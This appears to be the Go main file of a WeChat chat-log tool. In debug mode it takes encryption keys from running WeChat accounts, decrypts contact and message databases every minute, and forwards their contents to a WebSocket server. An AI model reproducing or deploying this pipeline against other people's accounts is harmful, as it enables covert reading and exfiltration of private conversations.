package main

import (
	"context"
	"database/sql"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/sjzar/chatlog/cmd/chatlog"
	"github.com/sjzar/chatlog/cmd/newdec"
	"github.com/sjzar/chatlog/internal/webscokets"
	"github.com/sjzar/chatlog/internal/wechat"
	"github.com/sjzar/chatlog/internal/wechat/decrypt"
	"github.com/sjzar/chatlog/pkg/filemonitor"
	"github.com/sjzar/chatlog/pkg/logger"
	"github.com/sjzar/chatlog/pkg/rbblot"
	"go.uber.org/zap"
)

// AccountInfo 账户信息结构
type AccountInfo struct {
	Name        string `json:"name"`
	Platform    string `json:"platform"`
	Version     int    `json:"version"`
	FullVersion string `json:"full_version"`
	DataDir     string `json:"data_dir"`
	Key         string `json:"key"`
	ImgKey      string `json:"img_key"`
	PID         uint32 `json:"pid"`
	ExePath     string `json:"exe_path"`
	Status      string `json:"status"`
	SavedAt     int64  `json:"saved_at"`
}

// DatabaseConfig 数据库配置
type DatabaseConfig struct {
	MaxMessageDBCount int `json:"max_message_db_count"` // 最大处理的message数据库数量
}

// FileState 文件状态跟踪
type FileState struct {
	Path         string    `json:"path"`
	LastModTime  time.Time `json:"last_mod_time"`
	LastProcTime time.Time `json:"last_proc_time"`
	Size         int64     `json:"size"`
}

// DatabaseState 数据库处理状态
type DatabaseState struct {
	ContactLastID   int64                `json:"contact_last_id"`
	MessageTableMap map[string]int64     `json:"message_table_map"` // 表名 -> 最后处理的local_id
	FileStates      map[string]FileState `json:"file_states"`       // 文件路径 -> 文件状态
}

// MemoryDatabase 内存数据库结构
type MemoryDatabase struct {
	DB   *sql.DB
	Path string
	Type string // "contact" 或 "message"
}

// DataProcessor 数据处理器
type DataProcessor struct {
	mutex       sync.Mutex
	accounts    []AccountInfo
	dbConfig    DatabaseConfig
	dbState     DatabaseState
	memoryDBs   map[string]*MemoryDatabase // 文件路径 -> 内存数据库
	wsClient    *webscokets.WebSocketClient
	processLock sync.Mutex // 防止重复处理的锁
}

// 实现 GlobalProcessor 接口
func (dp *DataProcessor) GetMutex() *sync.Mutex {
	return &dp.mutex
}

func (dp *DataProcessor) GetDBState() *webscokets.DatabaseState {
	// 转换为 webscokets.DatabaseState
	result := &webscokets.DatabaseState{
		ContactLastID:   dp.dbState.ContactLastID,
		MessageTableMap: dp.dbState.MessageTableMap,
	}
	return result
}

func (dp *DataProcessor) GetWSClient() *webscokets.WebSocketClient {
	return dp.wsClient
}

func (dp *DataProcessor) UpdateContactLastID(id int64) {
	dp.mutex.Lock()
	defer dp.mutex.Unlock()
	dp.dbState.ContactLastID = id
}

func (dp *DataProcessor) UpdateMessageTableLastID(tableName string, localID int64) {
	dp.mutex.Lock()
	defer dp.mutex.Unlock()
	dp.dbState.MessageTableMap[tableName] = localID
}

var (
	// 全局数据处理器
	globalProcessor *DataProcessor
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	// 初始化日志系统
	if err := logger.InitLogger(); err != nil {
		log.Fatalf("初始化日志系统失败: %v", err)
	}
	defer logger.Sync()

	logger.Info("程序启动")

	// 解析命令行参数
	debug := flag.Bool("debug", false, "启用debug模式，自动获取密钥并定期解密数据库")
	flag.Parse()

	// 检查是否是newdec命令
	if len(os.Args) > 1 && os.Args[1] == "newdec" {
		newdec.Run()
		return
	}

	// 如果启用了debug模式
	if *debug {
		runDebugMode()
		return
	}

	// 默认执行chatlog命令
	chatlog.Execute()
}

// runDebugMode debug模式主函数
func runDebugMode() {
	logger.Info("debug模式启动")

	// 初始化RBblot数据库
	rb := rbblot.NewBblot(10) // 10MB初始内存
	defer rb.Close()

	// 初始化全局数据处理器
	globalProcessor = &DataProcessor{
		memoryDBs: make(map[string]*MemoryDatabase),
		dbConfig: DatabaseConfig{
			MaxMessageDBCount: 3, // 默认处理最新的3个数据库
		},
		dbState: DatabaseState{
			ContactLastID:   0,
			MessageTableMap: make(map[string]int64),
			FileStates:      make(map[string]FileState),
		},
	}

	// 初始化WebSocket客户端
	config := webscokets.GetDefaultConfig()
	globalProcessor.wsClient = webscokets.NewWebSocketClient(config)

	// 尝试连接WebSocket服务器
	if err := globalProcessor.wsClient.ConnectWithRetry(); err != nil {
		logger.Warn("WebSocket连接失败", zap.Error(err))
	} else {
		logger.Info("WebSocket连接建立成功")
		// 启动消息监听
		go globalProcessor.wsClient.ListenMessages()
		// 启动心跳
		go globalProcessor.wsClient.StartHeartbeat()
	}
	defer func() {
		if globalProcessor.wsClient != nil {
			globalProcessor.wsClient.Close()
		}
	}()

	// 尝试从缓存中读取账户信息
	accounts := loadAccountsFromCache(rb)
	if len(accounts) == 0 {
		logger.Info("未找到缓存的账户信息，开始获取")
		accounts = getAndSaveAccounts(rb)
	}

	if len(accounts) == 0 {
		logger.Error("未找到任何可用的微信账户")
		return
	}

	globalProcessor.accounts = accounts

	// 设置全局处理器到 websockets 包
	webscokets.SetGlobalProcessor(globalProcessor)

	// 从缓存加载数据库状态
	loadDatabaseState(rb)

	logger.Info("找到账户，开始定期解密", zap.Int("account_count", len(accounts)))

	// 立即执行一次处理
	for _, account := range accounts {
		processAccountData(account)
	}

	// 定时器，每分钟执行一次
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	logger.Info("定时器启动，每分钟处理一次")

	for {
		select {
		case <-ticker.C:
			logger.Debug("定期处理任务开始")
			// 加锁防止重复处理
			globalProcessor.processLock.Lock()
			for _, account := range accounts {
				processAccountData(account)
			}
			// 保存数据库状态
			saveDatabaseState(rb)
			globalProcessor.processLock.Unlock()
			logger.Debug("定期处理任务完成")
		}
	}
}

// loadAccountsFromCache 从缓存中读取账户信息
func loadAccountsFromCache(rb *rbblot.RBblotCore) []AccountInfo {
	var accounts []AccountInfo

	data := rb.Get("accounts", "list")
	if len(data) == 0 {
		return accounts
	}

	if err := json.Unmarshal(data, &accounts); err != nil {
		logger.Error("反序列化账户信息失败", zap.Error(err))
		return nil
	}

	return accounts
}

// getAndSaveAccounts 获取并保存账户信息
func getAndSaveAccounts(rb *rbblot.RBblotCore) []AccountInfo {
	// 加载微信实例
	if err := wechat.Load(); err != nil {
		fmt.Printf("[错误] 加载微信实例失败: %v\n", err)
		return nil
	}

	wechatAccounts := wechat.GetAccounts()
	if len(wechatAccounts) == 0 {
		fmt.Println("[错误] 未找到微信实例")
		return nil
	}

	var accounts []AccountInfo
	ctx := context.Background()

	for _, acc := range wechatAccounts {
		fmt.Printf("[处理] 账户: %s\n", acc.Name)

		// 刷新账户状态
		if err := acc.RefreshStatus(); err != nil {
			logger.Info("[警告] 刷新账户%s状态失败: %v\n", zap.Error(err))
			continue
		}

		// 只处理在线账户
		if acc.Status != "online" {
			logger.Info("[跳过] 账户%s不在线，状态:", zap.Any("name", acc.Name), zap.Any("Status", acc.Status))
			continue
		}

		// 获取密钥
		key, imgKey, err := acc.GetKey(ctx)
		if err != nil {
			logger.Error("[错误] 获取账户密钥失败", zap.Any("name", acc.Name), zap.Error(err))
			continue
		}

		if imgKey != "" {
			fmt.Printf("  图片密钥: %s\n", imgKey[:20]+"...")
		}

		// 创建账户信息
		accountInfo := AccountInfo{
			Name:        acc.Name,
			Platform:    acc.Platform,
			Version:     acc.Version,
			FullVersion: acc.FullVersion,
			DataDir:     acc.DataDir,
			Key:         key,
			ImgKey:      imgKey,
			PID:         acc.PID,
			ExePath:     acc.ExePath,
			Status:      acc.Status,
			SavedAt:     time.Now().Unix(),
		}

		accounts = append(accounts, accountInfo)
	}

	if len(accounts) == 0 {
		logger.Info("未获取到任何有效账户信息")
		return nil
	}

	// 保存到缓存
	data, err := json.Marshal(accounts)
	if err != nil {
		logger.Error("序列化账户信息失败", zap.Error(err))
		return accounts
	}

	rb.Store("accounts", "list", data)
	logger.Info("成功保存账户信息到缓存", zap.Int("count", len(accounts)))

	return accounts
}

// loadDatabaseState 从缓存加载数据库状态
func loadDatabaseState(rb *rbblot.RBblotCore) {
	data := rb.Get("database", "state")
	if len(data) == 0 {
		return
	}

	if err := json.Unmarshal(data, &globalProcessor.dbState); err != nil {
		logger.Error("反序列化数据库状态失败", zap.Error(err))
		return
	}

	logger.Info("成功加载数据库状态")
}

// saveDatabaseState 保存数据库状态到缓存
func saveDatabaseState(rb *rbblot.RBblotCore) {
	data, err := json.Marshal(globalProcessor.dbState)
	if err != nil {
		logger.Error("序列化数据库状态失败", zap.Error(err))
		return
	}

	rb.Store("database", "state", data)
	logger.Debug("数据库状态已保存")
}

// processAccountData 处理账户数据（解密、读取、发送）
func processAccountData(account AccountInfo) {
	logger.Info("开始处理账户", zap.String("account", account.Name))

	// 创建解密器
	decryptor, err := decrypt.NewDecryptor(account.Platform, account.Version)
	if err != nil {
		logger.Error("创建解密器失败", zap.String("account", account.Name), zap.Error(err))
		return
	}

	// 获取需要处理的数据库文件
	contactFiles, messageFiles := getTargetDatabaseFiles(account)

	// 处理 contact.db
	if len(contactFiles) > 0 {
		processContactDatabase(decryptor, contactFiles[0], account)
	}

	// 处理 message_x.db 文件（只处理最新的几个）
	latestMessageFiles := getLatestMessageFiles(messageFiles, globalProcessor.dbConfig.MaxMessageDBCount)
	for _, file := range latestMessageFiles {
		processMessageDatabase(decryptor, file, account)
	}

	// 清理内存数据库，防止内存溢出
	cleanupMemoryDatabases()

	logger.Info("账户处理完成", zap.String("account", account.Name))
}

// cleanupMemoryDatabases 清理内存数据库，防止内存溢出
func cleanupMemoryDatabases() {
	globalProcessor.mutex.Lock()
	defer globalProcessor.mutex.Unlock()

	var closedCount int
	for path, memDB := range globalProcessor.memoryDBs {
		if memDB != nil && memDB.DB != nil {
			memDB.DB.Close()
			closedCount++
		}
		delete(globalProcessor.memoryDBs, path)
	}

	if closedCount > 0 {
		logger.Debug("清理内存数据库", zap.Int("closed_count", closedCount))
	}
}

// getTargetDatabaseFiles 获取目标数据库文件
func getTargetDatabaseFiles(account AccountInfo) (contactFiles []string, messageFiles []string) {
	// 根据平台和版本设置不同的文件模式
	var contactPattern, messagePattern string

	switch {
	case account.Platform == "windows" && account.Version == 3:
		contactPattern = `MicroMsg\.db$`
		messagePattern = `MSG([0-9]+)\.db$`
	case account.Platform == "windows" && account.Version == 4:
		contactPattern = `contact\.db$`
		messagePattern = `message_([0-9]+)\.db$`
	case account.Platform == "darwin" && account.Version == 3:
		contactPattern = `wccontact_new2\.db$`
		messagePattern = `msg_([0-9]+)\.db$`
	case account.Platform == "darwin" && account.Version == 4:
		contactPattern = `contact\.db$`
		messagePattern = `message_([0-9]+)\.db$`
	default:
		logger.Error("不支持的平台或版本",
			zap.String("platform", account.Platform),
			zap.Int("version", account.Version))
		return
	}

	// 创建文件组监控器
	contactGroup, err := filemonitor.NewFileGroup("contact", account.DataDir, contactPattern, []string{"fts"})
	if err != nil {
		logger.Error("创建联系人文件组失败", zap.Error(err))
	} else {
		contactFiles, _ = contactGroup.List()
	}

	messageGroup, err := filemonitor.NewFileGroup("message", account.DataDir, messagePattern, []string{"fts"})
	if err != nil {
		logger.Error("创建消息文件组失败", zap.Error(err))
	} else {
		messageFiles, _ = messageGroup.List()
	}

	return
}

// getLatestMessageFiles 获取最新的消息数据库文件
func getLatestMessageFiles(messageFiles []string, maxCount int) []string {
	if len(messageFiles) == 0 {
		return nil
	}

	// 按文件名中的数字排序（假设数字越大表示越新）
	sort.Slice(messageFiles, func(i, j int) bool {
		// 提取文件名中的数字
		regex := regexp.MustCompile(`([0-9]+)`)
		matchesI := regex.FindStringSubmatch(filepath.Base(messageFiles[i]))
		matchesJ := regex.FindStringSubmatch(filepath.Base(messageFiles[j]))

		if len(matchesI) < 2 || len(matchesJ) < 2 {
			return messageFiles[i] < messageFiles[j]
		}

		// 转换为数字比较
		var numI, numJ int
		fmt.Sscanf(matchesI[1], "%d", &numI)
		fmt.Sscanf(matchesJ[1], "%d", &numJ)

		return numI > numJ // 降序排列，数字大的在前
	})

	// 返回最新的 maxCount 个文件
	if len(messageFiles) > maxCount {
		return messageFiles[:maxCount]
	}
	return messageFiles
}

// processContactDatabase 处理联系人数据库
func processContactDatabase(decryptor decrypt.Decryptor, dbFile string, account AccountInfo) {
	// 检查文件是否需要更新
	if !needsUpdate(dbFile) {
		logger.Debug("联系人数据库无更新", zap.String("file", filepath.Base(dbFile)))
		return
	}

	logger.Info("处理联系人数据库", zap.String("file", filepath.Base(dbFile)))

	// 解密到内存
	memoryDB, err := decryptToMemory(decryptor, dbFile, account.Key, "contact")
	if err != nil {
		logger.Error("解密联系人数据库失败", zap.Error(err))
		return
	}
	// 在处理完成后立即释放内存数据库
	defer func() {
		if memoryDB != nil && memoryDB.DB != nil {
			memoryDB.DB.Close()
			logger.Debug("释放联系人数据库内存")
		}
	}()

	// 读取并发送联系人数据
	processContactData(memoryDB.DB, account)

	// 更新文件状态
	updateFileState(dbFile)
}

// processMessageDatabase 处理消息数据库
func processMessageDatabase(decryptor decrypt.Decryptor, dbFile string, account AccountInfo) {
	// 检查文件是否需要更新
	if !needsUpdate(dbFile) {
		logger.Debug("消息数据库无更新", zap.String("file", filepath.Base(dbFile)))
		return
	}

	logger.Info("处理消息数据库", zap.String("file", filepath.Base(dbFile)))

	// 解密到内存
	memoryDB, err := decryptToMemory(decryptor, dbFile, account.Key, "message")
	if err != nil {
		logger.Error("解密消息数据库失败", zap.Error(err))
		return
	}
	// 在处理完成后立即释放内存数据库
	defer func() {
		if memoryDB != nil && memoryDB.DB != nil {
			memoryDB.DB.Close()
			logger.Debug("释放消息数据库内存")
		}
	}()

	// 读取并发送消息数据
	processMessageData(memoryDB.DB, account, dbFile)

	// 更新文件状态
	updateFileState(dbFile)
}

// needsUpdate 检查文件是否需要更新
func needsUpdate(filePath string) bool {
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		logger.Error("获取文件信息失败", zap.String("file", filePath), zap.Error(err))
		return false
	}

	globalProcessor.mutex.Lock()
	defer globalProcessor.mutex.Unlock()

	// 检查文件状态
	state, exists := globalProcessor.dbState.FileStates[filePath]
	if !exists {
		// 新文件，需要处理
		return true
	}

	// 比较修改时间和文件大小
	if fileInfo.ModTime().After(state.LastModTime) || fileInfo.Size() != state.Size {
		return true
	}

	return false
}

// updateFileState 更新文件状态
func updateFileState(filePath string) {
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		logger.Error("获取文件信息失败", zap.String("file", filePath), zap.Error(err))
		return
	}

	globalProcessor.mutex.Lock()
	defer globalProcessor.mutex.Unlock()

	globalProcessor.dbState.FileStates[filePath] = FileState{
		Path:         filePath,
		LastModTime:  fileInfo.ModTime(),
		LastProcTime: time.Now(),
		Size:         fileInfo.Size(),
	}
}

// decryptToMemory 解密数据库到内存
func decryptToMemory(decryptor decrypt.Decryptor, dbFile, key, dbType string) (*MemoryDatabase, error) {
	// 检查是否已经存在在内存中
	globalProcessor.mutex.Lock()
	memDB, exists := globalProcessor.memoryDBs[dbFile]
	globalProcessor.mutex.Unlock()

	if exists {
		// 检查文件是否需要更新
		if !needsUpdate(dbFile) {
			return memDB, nil
		}
		// 需要更新，关闭旧的数据库
		memDB.DB.Close()
	}

	// 创建内存数据库
	memoryDB, err := sql.Open("sqlite3", ":memory:")
	if err != nil {
		return nil, fmt.Errorf("创建内存数据库失败: %v", err)
	}

	// 创建临时文件进行解密
	tempFile, err := os.CreateTemp("", "chatlog_decrypt_*.db")
	if err != nil {
		memoryDB.Close()
		return nil, fmt.Errorf("创建临时文件失败: %v", err)
	}
	tempPath := tempFile.Name()
	tempFile.Close()
	defer os.Remove(tempPath) // 确保清理临时文件

	// 解密到临时文件
	outputFile, err := os.Create(tempPath)
	if err != nil {
		memoryDB.Close()
		return nil, fmt.Errorf("创建输出文件失败: %v", err)
	}

	ctx := context.Background()
	err = decryptor.Decrypt(ctx, dbFile, key, outputFile)
	outputFile.Close()

	if err != nil {
		// 如果已经解密，直接复制文件
		if strings.Contains(err.Error(), "already decrypted") {
			logger.Debug("文件已解密，直接复制", zap.String("file", filepath.Base(dbFile)))
			data, readErr := os.ReadFile(dbFile)
			if readErr != nil {
				memoryDB.Close()
				return nil, fmt.Errorf("读取文件失败: %v", readErr)
			}
			if writeErr := os.WriteFile(tempPath, data, 0644); writeErr != nil {
				memoryDB.Close()
				return nil, fmt.Errorf("写入临时文件失败: %v", writeErr)
			}
		} else {
			memoryDB.Close()
			return nil, fmt.Errorf("解密失败: %v", err)
		}
	}

	// 附加临时数据库
	_, err = memoryDB.Exec(fmt.Sprintf("ATTACH DATABASE '%s' AS temp_db;", tempPath))
	if err != nil {
		memoryDB.Close()
		return nil, fmt.Errorf("附加数据库失败: %v", err)
	}

	// 获取所有表名
	rows, err := memoryDB.Query("SELECT name FROM temp_db.sqlite_master WHERE type='table';")
	if err != nil {
		memoryDB.Close()
		return nil, fmt.Errorf("获取表名失败: %v", err)
	}

	var tables []string
	for rows.Next() {
		var tableName string
		if err := rows.Scan(&tableName); err != nil {
			continue
		}
		tables = append(tables, tableName)
	}
	rows.Close()

	// 复制所有表到内存数据库
	for _, table := range tables {
		_, err = memoryDB.Exec(fmt.Sprintf("CREATE TABLE %s AS SELECT * FROM temp_db.%s;", table, table))
		if err != nil {
			logger.Warn("复制表失败", zap.String("table", table), zap.Error(err))
		}
	}

	// 分离临时数据库
	_, err = memoryDB.Exec("DETACH DATABASE temp_db;")
	if err != nil {
		logger.Warn("分离数据库失败", zap.Error(err))
	}

	// 创建内存数据库对象（不再缓存，用后即释放）
	memDB = &MemoryDatabase{
		DB:   memoryDB,
		Path: dbFile,
		Type: dbType,
	}

	logger.Debug("数据库解密并加载到内存成功",
		zap.String("file", filepath.Base(dbFile)),
		zap.String("type", dbType),
		zap.Int("tables", len(tables)))

	return memDB, nil
}

// 以下函数供 sendmsg.go 使用
func processContactData(db *sql.DB, account AccountInfo) {
	webscokets.ProcessContactData(db, account)
}

func processMessageData(db *sql.DB, account AccountInfo, dbFile string) {
	webscokets.ProcessMessageData(db, account, dbFile)
}
